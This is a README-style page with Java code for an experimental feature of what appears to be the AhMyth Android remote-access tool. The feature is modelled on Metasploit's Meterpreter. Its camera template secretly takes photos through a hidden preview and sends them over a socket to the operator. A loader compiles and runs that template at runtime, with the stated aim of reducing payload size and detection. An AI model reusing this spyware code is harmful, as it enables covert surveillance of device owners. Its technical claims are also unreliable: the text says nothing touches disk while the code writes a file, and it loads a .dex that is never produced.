## <div align="center">Dynamic "In-Memory at Runtime" Camera Class Generation & Loading</div>
> A feature inspired by Metasploit Framework's Android Meterpreter payload.

If this ever does become a reality it will aid GREATLY in minimising the payload size and possibly detection as well.

<details>
  <summary>Experminetal Code Explanation</summary>
  <br>
  
The provided code in the dropdown tab below this one, performs the following operations listed below, all in memory, except for the part responsible for the generation of the "CameraManager.java" file, which is later used for dynamic in memory compilation, but even there, nothing is physically written to disk at all, Everything else, including compilation, loading, and instance creation, occurs entirely in memory.
  
**Generation Phase (In Memory):**

1. **Retrieve Source Code (In Memory):**
   - The source code is retrieved from `CamTemp.CAMERA_SOURCE_CODE` and stored in the `camTempSourceCode` variable, all in memory.

2. **Generate Dynamic Class (In Memory):**
   - Using the retrieved source code, a dynamic Java class is generated in memory using `TypeSpec.classBuilder("CameraManager")` from the `JavaPoet` library. The class is created entirely in memory.

3. **Create Java File (In Memory):**
   - A Java file, containing the generated dynamic class, is created in memory (`JavaFile`). The class is placed in a package named "ahmyth.mine.king.ahmyth," but this is all done in memory.

4. **Write Java Code to a File (On Disk):**
   - The generated Java code is written to a file named "CameraManager.java" using a `FileWriter`, but this file is also created in memory and later used for compilation. No physical file is written to disk during this phase.

**Loading Phase (In Memory):**

1. **Compilation (In Memory):**
   - The generated Java code in "CameraManager.java" is compiled entirely in memory using the Java Compiler API (`JavaCompiler`). This means the compilation result is held in memory.

2. **Check Compilation Result (In Memory):**
   - After compilation, it checks the `compilationResult` entirely in memory to determine if the compilation was successful or not. There is no physical file on disk involved in this step.

3. **Load Compiled Class (In Memory):**
   - A `DexClassLoader` is used to load the compiled class in memory from the generated .dex file, without writing anything to disk.

4. **Create Instance (In Memory):**
   - Finally, an instance of the dynamically generated class is created entirely in memory using reflection (`generatedClass.getDeclaredConstructor().newInstance()`). This instance exists only in memory and can be used for further operations.

</details>

<details>
  <summary>Code</summary>

- ClassGen.java
> Responsible for Dynamically both Generating and Loading the Camera Manager Class at runtime completely in-memory.
```java
package ahmyth.mine.king.ahmyth;

import com.squareup.javapoet.*;
import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;
import java.io.FileWriter;
import java.lang.reflect.Method;
import dalvik.system.DexClassLoader;

public class ClassGen {
    public static void main(String[] args) {
        try {
            String camTempSourceCode = CamTemp.CAMERA_SOURCE_CODE;

            TypeSpec generatedClass = TypeSpec.classBuilder("CameraManager") // Change the class name here
                    .addCode(camTempSourceCode)
                    .build();

            JavaFile javaFile = JavaFile.builder("ahmyth.mine.king.ahmyth", generatedClass)
                    .build();

            String javaCode = javaFile.toString();

            try (FileWriter writer = new FileWriter("CameraManager.java")) { // Change the output file name here
                writer.write(javaCode);
            }

            String dexPath = "./";
            String optimizedDexOutputPath = "./";

            JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
            int compilationResult = compiler.run(null, null, null, "CameraManager.java"); // Change the input file name here

            if (compilationResult == 0) {
                System.out.println("Compilation succeeded.");
            } else {
                System.err.println("Compilation failed.");
                System.exit(compilationResult);
            }

            ClassLoader classLoader = new DexClassLoader(
                    "CameraManager.dex", // Change the compiled .dex file name here
                    optimizedDexOutputPath,
                    null,
                    ClassLoader.getSystemClassLoader()
            );

            executeDynamicallyGeneratedClass(classLoader);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void executeDynamicallyGeneratedClass(ClassLoader classLoader) throws Exception {
        Class<?> generatedClass = classLoader.loadClass("ahmyth.mine.king.ahmyth.CameraManager"); // Change the class name here
        Object generatedInstance = generatedClass.getDeclaredConstructor().newInstance();
    }
}
```
- CamTemp.java
> Template file for the Camera Manager Class needed for dynamic generation
```java
package ahmyth.mine.king.ahmyth;

public class CamTemp {
    public static final String CAMERA_SOURCE_CODE =
            "package ahmyth.mine.king.ahmyth;\n" +
            "import android.content.Context;\n" +
            "import android.content.pm.PackageManager;\n" +
            "import android.graphics.Bitmap;\n" +
            "import android.graphics.BitmapFactory;\n" +
            "import android.graphics.SurfaceTexture;\n" +
            "import android.hardware.Camera;\n" +
            "import android.hardware.Camera.PictureCallback;\n" +
            "import android.hardware.Camera.Parameters;\n" +
            "import org.json.JSONArray;\n" +
            "import org.json.JSONException;\n" +
            "import org.json.JSONObject;\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "public class CameraManager {\n" +
            "    private Context context;\n" +
            "    private Camera camera;\n" +
            "    public CameraManager(Context context) {\n" +
            "        this.context = context;\n" +
            "    }\n" +
            "    public void startUp(int cameraID) {\n" +
            "        camera = Camera.open(cameraID);\n" +
            "        Parameters parameters = camera.getParameters();\n" +
            "        camera.setParameters(parameters);\n" +
            "        try {\n" +
            "            camera.setPreviewTexture(new SurfaceTexture(0));\n" +
            "            camera.startPreview();\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        camera.takePicture(null, null, new PictureCallback() {\n" +
            "            @Override\n" +
            "            public void onPictureTaken(byte[] data, Camera camera) {\n" +
            "                releaseCamera();\n" +
            "                sendPhoto(data);\n" +
            "            }\n" +
            "        });\n" +
            "    }\n" +
            "    private void sendPhoto(byte[] data) {\n" +
            "        try {\n" +
            "            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);\n" +
            "            ByteArrayOutputStream bos = new ByteArrayOutputStream();\n" +
            "            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);\n" +
            "            JSONObject object = new JSONObject();\n" +
            "            object.put(\"image\", true);\n" +
            "            object.put(\"buffer\", bos.toByteArray());\n" +
            "            IOSocket.getInstance().getIoSocket().emit(\"x0000ca\", object);\n" +
            "        } catch (JSONException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    private void releaseCamera() {\n" +
            "        if (camera != null) {\n" +
            "            camera.stopPreview();\n" +
            "            camera.release();\n" +
            "            camera = null;\n" +
            "        }\n" +
            "    }\n" +
            "    public JSONObject findCameraList() {\n" +
            "        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {\n" +
            "            return null;\n" +
            "        }\n" +
            "        try {\n" +
            "            JSONObject cameras = new JSONObject();\n" +
            "            JSONArray list = new JSONArray();\n" +
            "            cameras.put(\"camList\", true);\n" +
            "            int numberOfCameras = Camera.getNumberOfCameras();\n" +
            "            for (int i = 0; i < numberOfCameras; i++) {\n" +
            "                Camera.CameraInfo info = new Camera.CameraInfo();\n" +
            "                Camera.getCameraInfo(i, info);\n" +
            "                JSONObject jo = new JSONObject();\n" +
            "                jo.put(\"id\", i);\n" +
            "                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {\n" +
            "                    jo.put(\"name\", \"Front\");\n" +
            "                } else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {\n" +
            "                    jo.put(\"name\", \"Back\");\n" +
            "                } else {\n" +
            "                    jo.put(\"name\", \"Other\");\n" +
            "                }\n" +
            "                list.put(jo);\n" +
            "            }\n" +
            "            cameras.put(\"list\", list);\n" +
            "            return cameras;\n" +
            "        } catch (JSONException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        return null;\n" +
            "    }\n" +
            "}\n" +
            "}";
}
```

</details>
